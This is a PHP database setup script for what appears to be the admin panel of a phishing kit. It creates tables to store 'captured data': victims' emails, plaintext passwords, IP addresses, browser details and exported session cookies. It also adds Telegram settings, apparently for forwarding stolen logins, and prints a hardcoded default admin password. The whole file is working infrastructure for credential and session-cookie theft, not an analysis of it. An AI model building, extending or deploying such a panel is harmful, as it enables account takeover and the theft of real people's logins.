
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$dsn = 'sqlite:' . __DIR__ . '/passwords.db';
try {
    $db = new PDO($dsn);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Create users table for authentication
    $db->exec("CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY, 
        password TEXT
    )");
    
    // Create accounts table for storing captured data
    $db->exec("CREATE TABLE IF NOT EXISTS accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        ip_address TEXT,
        location TEXT DEFAULT 'Unknown',
        browser TEXT,
        os TEXT,
        service_type TEXT,
        cookies_json TEXT,
        cookies_json_export TEXT,
        cookie_script TEXT,
        verified INTEGER DEFAULT 0,
        favorite INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Add cookies_json_export column if it doesn't exist (for existing databases)
    try {
        $db->exec("ALTER TABLE accounts ADD COLUMN cookies_json_export TEXT");
    } catch (PDOException $e) {
        // Column already exists, ignore
    }
    
    // Create settings table for Telegram and other configurations
    $db->exec("CREATE TABLE IF NOT EXISTS settings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        setting_key TEXT UNIQUE NOT NULL,
        setting_value TEXT,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
    
    // Create indexes for better performance
    $db->exec("CREATE INDEX IF NOT EXISTS idx_email ON accounts(email)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_service_type ON accounts(service_type)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_verified ON accounts(verified)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_favorite ON accounts(favorite)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_created_at ON accounts(created_at)");
    
    // Insert default admin password if users table is empty
    $stmt = $db->query("SELECT COUNT(*) FROM users");
    if ($stmt->fetchColumn() == 0) {
        $defaultPassword = password_hash('HitTheGroundRunning.exe', PASSWORD_BCRYPT);
        $stmt = $db->prepare("INSERT INTO users (password) VALUES (:password)");
        $stmt->bindParam(':password', $defaultPassword);
        $stmt->execute();
    }
    
    echo "Database and tables created successfully!<br>";
    echo "Tables: users, accounts, settings<br>";
    echo "Default admin password: HitTheGroundRunning.exe";
} catch (PDOException $e) {
    echo "Failed to create database: " . $e->getMessage();
}
?>